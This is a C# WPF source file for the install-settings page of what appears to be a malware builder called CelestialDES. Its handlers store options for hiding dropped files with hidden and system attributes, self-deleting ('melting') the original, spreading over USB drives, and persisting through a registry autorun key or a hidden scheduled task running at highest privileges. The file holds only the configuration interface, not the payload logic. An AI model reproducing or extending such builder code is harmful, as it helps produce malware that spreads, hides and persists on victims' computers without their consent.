using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Navigation;
using System.Windows.Shapes;

namespace CelestialDES.Pages.BuilderPages
{
    /// <summary>
    /// Логика взаимодействия для Install.xaml
    /// </summary>
    public partial class Install : Page
    {
        public Install()
        {
            InitializeComponent();
        }
        private void ComboBox_DropDownClosed(object sender, EventArgs e)
        {
            string fullpath = Environment.ExpandEnvironmentVariables(cmbSelect.Text) + "\\" + FolderText.Text + "\\" + FilenameText.Text;
            Fullpath.Text = fullpath;
            Fullpath.Visibility = Visibility.Visible;
            if (cmbSelect.SelectedIndex == 3 || cmbSelect.SelectedIndex == 4) //sel ind already updated
            {
                // change sel Index of other Combo for example
                admrightpath.Visibility = Visibility.Visible;
            }else { admrightpath.Visibility = Visibility.Hidden; }
            Setting.InstallFolder = cmbSelect.Text;
            Setting.InstallSubFolder = FolderText.Text;
            Setting.InstallName = FilenameText.Text;
        }

        private void cmbSelect_SelectionChanged(object sender, SelectionChangedEventArgs e)
        {
            string fullpath = Environment.ExpandEnvironmentVariables(cmbSelect.Text) + "\\" + FolderText.Text + "\\" + FilenameText.Text;
            Fullpath.Text = fullpath;
            Fullpath.Visibility = Visibility.Visible;
            if (cmbSelect.SelectedIndex == 3 || cmbSelect.SelectedIndex == 4) //sel ind already updated
            {
                // change sel Index of other Combo for example
                admrightpath.Visibility = Visibility.Visible;
            }
            else { admrightpath.Visibility = Visibility.Hidden; }
            Setting.InstallFolder = cmbSelect.Text;
            Setting.InstallSubFolder = FolderText.Text;
            Setting.InstallName = FilenameText.Text;
        }

        private void FolderText_KeyDown(object sender, KeyEventArgs e)
        {
            string fullpath = Environment.ExpandEnvironmentVariables(cmbSelect.Text) + "\\" + FolderText.Text + "\\" + FilenameText.Text;
            Fullpath.Text = fullpath;
            Setting.InstallFolder = cmbSelect.Text;
            Setting.InstallSubFolder = FolderText.Text;
            Setting.InstallName = FilenameText.Text;
        }

        private void FilenameText_KeyDown(object sender, KeyEventArgs e)
        {
            string fullpath = Environment.ExpandEnvironmentVariables(cmbSelect.Text) + "\\" + FolderText.Text + "\\" + FilenameText.Text;
            Fullpath.Text = fullpath;
            Setting.InstallFolder = cmbSelect.Text;
            Setting.InstallSubFolder = FolderText.Text;
            Setting.InstallName = FilenameText.Text;
        }

        private void Install_Checked(object sender, RoutedEventArgs e)
        {
            Setting.needInstall = "true";
        }
        private void Install_UNChecked(object sender, RoutedEventArgs e)
        {
            Setting.needInstall = "false";
        }

        private void HiddenAttr_Checked(object sender, RoutedEventArgs e)
        {
            Setting.HideEverything = "true";
        }

        private void HiddenAttr_unChecked(object sender, RoutedEventArgs e)
        {
            Setting.HideEverything = "false";
        }

        private void HiddenAttrS_Checked(object sender, RoutedEventArgs e)
        {
            Setting.HideEverythingSys = "true";
        }

        private void HiddenAttrS_unChecked(object sender, RoutedEventArgs e)
        {
            Setting.HideEverythingSys = "false";
        }

        private void MeltFile_Check(object sender, RoutedEventArgs e)
        {
            Setting.InstallMelt = "true";
        }

        private void MeltFile_unCheck(object sender, RoutedEventArgs e)
        {
            Setting.InstallMelt = "false";
        }

        private void USB_Check(object sender, RoutedEventArgs e)
        {
            Setting.USBSpread = "true";
        }

        private void USB_unCheck(object sender, RoutedEventArgs e)
        {
            Setting.USBSpread = "false";
        }

        private void SpreadText_TextChanged(object sender, TextChangedEventArgs e)
        {
            Setting.USBSpreadn = SpreadText.Text;
        }

        private void DisabledRadio_Checked(object sender, RoutedEventArgs e)
        {
            Setting.AutoRunMethod = "none";
        }

        private void RegistryRadio_Checked(object sender, RoutedEventArgs e)
        {
            Setting.AutoRunMethod = "first";
        }

        private void ScheduleRadio_Checked(object sender, RoutedEventArgs e)
        {
            Setting.AutoRunMethod = "secound";
        }

        private void RegistryText_TextChanged(object sender, TextChangedEventArgs e)
        {
            Setting.RegistryKeyName = RegistryText.Text;
        }

        private void ScheduleText_TextChanged(object sender, TextChangedEventArgs e)
        {
            Setting.NameInTasks = ScheduleText.Text;
        }

        private void CheckBox_Checked(object sender, RoutedEventArgs e)
        {
            Setting.AutoRunhidden = "true";
        }

        private void CheckBox_Unchecked(object sender, RoutedEventArgs e)
        {
            Setting.AutoRunhidden = "false";
        }

        private void CheckBox_Checked_1(object sender, RoutedEventArgs e)
        {
            Setting.AutoRunHighest = "true";
        }

        private void CheckBox_Unchecked_1(object sender, RoutedEventArgs e)
        {
            Setting.AutoRunHighest = "false";
        }

        private void CheckBox_Checked_2(object sender, RoutedEventArgs e)
        {
            Setting.TryAnotherIfFails = "true";
        }

        private void CheckBox_Unchecked_2(object sender, RoutedEventArgs e)
        {
            Setting.TryAnotherIfFails = "false";
        }

        private void Page_IsVisibleChanged(object sender, DependencyPropertyChangedEventArgs e)
        {
            instalcheck.IsChecked = Convert.ToBoolean(Setting.needInstall);
            cmbSelect.Text = Setting.InstallFolder;
            FolderText.Text = Setting.InstallSubFolder;
            FilenameText.Text = Setting.InstallName;
            HiddenC.IsChecked = Convert.ToBoolean(Setting.HideEverything);
            HiddenSC.IsChecked = Convert.ToBoolean(Setting.HideEverythingSys);
            MeltFile.IsChecked = Convert.ToBoolean(Setting.InstallMelt);
            USBSpr.IsChecked = Convert.ToBoolean(Setting.USBSpread);
            SpreadText.Text = Setting.USBSpreadn;
            if (Setting.AutoRunMethod == "none")
            {
                DisabledRadio.IsChecked = true;
                RegistryRadio.IsChecked = false;
                ScheduleRadio.IsChecked = false;
            }
            else if (Setting.AutoRunMethod == "first")
            {
                DisabledRadio.IsChecked = false;
                RegistryRadio.IsChecked = true;
                ScheduleRadio.IsChecked = false;
            }
            else if (Setting.AutoRunMethod == "secound")
            {
                DisabledRadio.IsChecked = false;
                RegistryRadio.IsChecked = false;
                ScheduleRadio.IsChecked = true;
            }

            RegistryText.Text = Setting.RegistryKeyName;
            ScheduleText.Text = Setting.NameInTasks;
            HighPri.IsChecked = Convert.ToBoolean(Setting.AutoRunHighest);
            HiddenReg.IsChecked = Convert.ToBoolean(Setting.AutoRunhidden);
            OtherMethod.IsChecked = Convert.ToBoolean(Setting.TryAnotherIfFails);
            cmbSelect.Text = Setting.InstallFolder;
            string fullpath = Environment.ExpandEnvironmentVariables(cmbSelect.Text) + "\\" + FolderText.Text + "\\" + FilenameText.Text;
            Fullpath.Text = fullpath;
        }
    }
}
